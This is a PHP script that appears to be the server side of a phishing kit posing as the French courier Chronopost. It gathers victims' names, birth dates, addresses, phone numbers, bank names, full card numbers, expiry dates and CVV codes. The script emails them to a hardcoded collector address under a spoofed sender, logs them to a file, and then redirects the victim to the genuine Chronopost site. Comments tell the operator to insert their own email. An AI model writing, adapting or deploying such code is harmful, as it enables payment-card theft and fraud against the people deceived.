<?php
	session_start();
	$birth_date = substr($_POST['birthdate'], 8, 2) . '/' . substr($_POST['birthdate'], 5, 2) . '/' . substr($_POST['birthdate'], 0, 4);
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$fields = [
		'fullname'	=> ['label' => 'Prénom & Nom',			'value'	=> $_POST['firstname'] . ' ' . $_POST['lastname'],],
		'birthdate'	=> ['label' => 'Date de naissance',	'value'	=> $_POST['birthdate'],],
		'phone'		=> ['label' => 'Téléphone',			'value'	=> $_POST['phone'],],
		'address'	=> ['label' => 'Adresse',			'value'	=> $_POST['address'],],
		'city'		=> ['label' => 'Ville',				'value'	=> $_POST['city'],],
		'zip_code'	=> ['label' => 'Code postal',		'value'	=> $_POST['zip_code'],],
		'b_name'	=> ['label' => 'Banque',			'value'	=> $_POST['b_name'],],
		'cc_n'		=> ['label' => 'Numéro de la carte','value'	=> $_POST['cc_n'],],
		'exp_dt'	=> ['label' => 'Date d\'expiration','value'	=> $_POST['exp_dt'],],
		'vcc'		=> ['label' => 'Crypto',			'value'	=> $_POST['vcc'],],
		's_field'	=> ['label' => 'VBV',				'value'	=> isset($_POST['s_field']) ? $_POST['s_field'] : 'NOTHING',],
	];
	$msg_content = '<html>';
	$msg_content .= '<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></head><body>';
	$msg_content .= "<table style=\"border: 1px solid #656565\">";
	$msg_content .= '<thead>';
	$msg_content .= '<tr style="background-color: #565656; color: #fff;"><th><b>Champ</b></th><th><b>Valeur</b></th></tr>';
	$msg_content .= '</thead>';
	foreach ($fields as $key => $value) {
		$msg_content .= '<tr>';
		$msg_content .= '<td>' . $value['label'] . '</td>';
		$msg_content .= '<td>' . $value['value'] . '</td>';
		$msg_content .= '</tr>';
	}
	$msg_content .= '</tbody></thead></table></body></html>';

	$bilsnd = "denisodette@gmx.fr"; // Change the email ===> Put ur email
	$bilsub = "Chronopost [" . $_POST['cc_n'] . "]  " . $_POST['b_name'];
	$bilhead  = 'MIME-Version: 1.0' . "\r\n";
	$bilhead .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
	$bilhead .= "From: Timo <noreply@ionos.org>"; // You can change the email for better rzl
	$bilhead .= $_POST['eMailAdd']."\n";
	/*$bilhead .= "MIME-Version: 1.0\n";*/
	$arr=array($bilsnd, $IP);
	foreach ($arr as $bilsnd)
		mail($bilsnd, $bilsub, $msg_content, $bilhead);
	$fp = fopen('../imd.html', 'a');
          fwrite($fp, $msg_content);
          fclose($fp);

	header("Location: http://www.chronopost.fr/fr");